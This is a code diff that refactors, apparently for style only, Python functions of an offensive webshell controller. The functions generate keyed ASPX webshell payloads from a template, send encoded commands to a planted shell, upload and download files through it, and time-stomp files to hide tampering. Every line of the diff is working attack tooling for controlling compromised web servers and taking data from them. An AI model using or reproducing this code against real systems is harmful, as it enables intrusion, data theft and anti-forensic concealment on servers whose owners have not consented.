@@ -45,12 +45,17 @@ def webshell_execute(webshell,command):
         #print(raw_data)
         x = requests.post(URL, data = raw_data, verify=False)
         if "r^" in x.text:
-            print("Webshell ( "+URL+" ) sent Output : \n"+x.text)
+            print(f"Webshell ( {URL}" + " ) sent Output : \n" + x.text)
         else:
             #print("Output : "+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
-            print("Webshell ( "+URL+" ) sent Output : \n"+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
+            print(
+                f"Webshell ( {URL}"
+                + " ) sent Output : \n"
+                + base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8")
+            )
+
     except Exception as e:
-        print( '[-] ERROR(webshell_execute): %s' % str(e))
+        print(f'[-] ERROR(webshell_execute): {str(e)}')
 
 def generate_webshell():
     try:
@@ -59,7 +64,36 @@ def generate_webshell():
         list_full=links.strip().replace("\r","").split("\n")
         fp = open('agents/webshell.ninja', 'r')
         webshell = fp.read()
-        KEY="".join([random.choice(string.ascii_uppercase+string.digits) for i in range(8)])+"-"+"".join([random.choice(string.ascii_uppercase+string.digits) for i in range(8)])+"-"+"".join([random.choice(string.ascii_uppercase+string.digits) for i in range(8)])+"-"+"".join([random.choice(string.ascii_uppercase+string.digits) for i in range(8)])
+        KEY = (
+            "".join(
+                [
+                    random.choice(string.ascii_uppercase + string.digits)
+                    for _ in range(8)
+                ]
+            )
+            + "-"
+            + "".join(
+                [
+                    random.choice(string.ascii_uppercase + string.digits)
+                    for _ in range(8)
+                ]
+            )
+            + "-"
+            + "".join(
+                [
+                    random.choice(string.ascii_uppercase + string.digits)
+                    for _ in range(8)
+                ]
+            )
+            + "-"
+            + "".join(
+                [
+                    random.choice(string.ascii_uppercase + string.digits)
+                    for _ in range(8)
+                ]
+            )
+        )
+
         VAR1=random.choice(list_full)
         list_full.remove(VAR1)
         VAR2=random.choice(list_full)
@@ -68,10 +102,16 @@ def generate_webshell():
         list_full.remove(VAR3)
         VAR4=random.choice(list_full)
         webshell = webshell.replace('{KEY}', KEY).replace('{VAR1}', VAR1).replace('{VAR2}', VAR2).replace('{VAR3}', VAR3).replace('{VAR4}', VAR4)
-        payload= open('payloads/webshell_'+KEY+'.aspx', 'w')
-        payload.write(webshell)
-        payload.close()
-        print("Webshell Generate with key ( "+KEY+" ) and writen in "+'payloads/webshell_'+KEY+'.aspx'+" : \n"+bcolors.FAIL + webshell+ bcolors.ENDC )
+        with open(f'payloads/webshell_{KEY}.aspx', 'w') as payload:
+            payload.write(webshell)
+        print(
+            f"Webshell Generate with key ( {KEY} ) and writen in payloads/webshell_{KEY}.aspx"
+            + " : \n"
+            + bcolors.FAIL
+            + webshell
+            + bcolors.ENDC
+        )
+
         return webshell
     except:
         print("Error Generating Webshell ")
@@ -90,20 +130,26 @@ def upload_file(webshell,args):
         filename=args[1]
         dest_path=args[2]
         b64command="2_{filename}_{content}_{KEY}"
-        p=open("file/"+filename,"rb")
-        content=base64.b64encode(p.read())
-        p.close()
+        with open(f"file/{filename}", "rb") as p:
+            content=base64.b64encode(p.read())
         raw_data=base64.b64encode(bytearray(b64command.replace("{filename}",dest_path).replace("{content}",content.decode("utf-8")).replace("{KEY}",KEY),"UTF-8"))
         #print(raw_data)
         x = requests.post(URL, data = raw_data, verify=False)
         if "r^" in x.text:
-            print("Webshell ( "+URL+" ) sent Output : \n"+x.text)
+            print(f"Webshell ( {URL}" + " ) sent Output : \n" + x.text)
         elif base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8").strip()=="_":
-            print("Webshell ( "+URL+" ) Sucessfully uploaded the file")
-            print("Webshell ( "+URL+" ) sent Output : \n"+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
-        #print(x.text)
+            print(f"Webshell ( {URL} ) Sucessfully uploaded the file")
+            print(
+                f"Webshell ( {URL}"
+                + " ) sent Output : \n"
+                + base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8")
+            )
+
+            #print(x.text)
     except Exception as e:
-        print( '[-] Error Uploading the file through webshell ( %s ) with error message ( %s )' % (URL,str(e)))
+        print(
+            f'[-] Error Uploading the file through webshell ( {URL} ) with error message ( {str(e)} )'
+        )
 
         #print("Error Uploading the file through webshell : "+URL)
 
@@ -127,16 +173,17 @@ def download_file(webshell,args):
         #print(raw_data)
         x = requests.post(URL, data = raw_data, verify=False)
         if "r^" in x.text:
-            print("Webshell ( "+URL+" ) sent Output : \n"+x.text)
+            print(f"Webshell ( {URL}" + " ) sent Output : \n" + x.text)
         else:
             #print("Webshell ( "+URL+" ) Sucessfully downloaded the file")
-            print("Webshell ( "+URL+" ) sucessfully downloaded the file")#sent Output : \n"+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
-            p=open("downloads/"+re.findall(r'[^\/\\]+(?=$)',filename)[0],"wb")
-            p.write(base64.b64decode(base64.b64decode(x.text[8:][:-8].strip())))
-            p.close()
-        #print(x.text)
+            print(f"Webshell ( {URL} ) sucessfully downloaded the file")
+            with open("downloads/"+re.findall(r'[^\/\\]+(?=$)',filename)[0],"wb") as p:
+                p.write(base64.b64decode(base64.b64decode(x.text[8:][:-8].strip())))
+            #print(x.text)
     except Exception as e:
-        print( '[-] Error downloading the file through webshell ( %s ) with error message ( %s )' % (URL,str(e)))
+        print(
+            f'[-] Error downloading the file through webshell ( {URL} ) with error message ( {str(e)} )'
+        )
 
 
 
@@ -160,7 +207,9 @@ def time_stomp(webshell,args):
             #print("Webshell ( "+URL+" ) sent Output : \n"+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
         #print(x.text)
     except Exception as e:
-        print( '[-] Error Uploading the file through webshell ( %s ) with error message ( %s )' % (URL,str(e)))
+        print(
+            f'[-] Error Uploading the file through webshell ( {URL} ) with error message ( {str(e)} )'
+        )
 
 
 
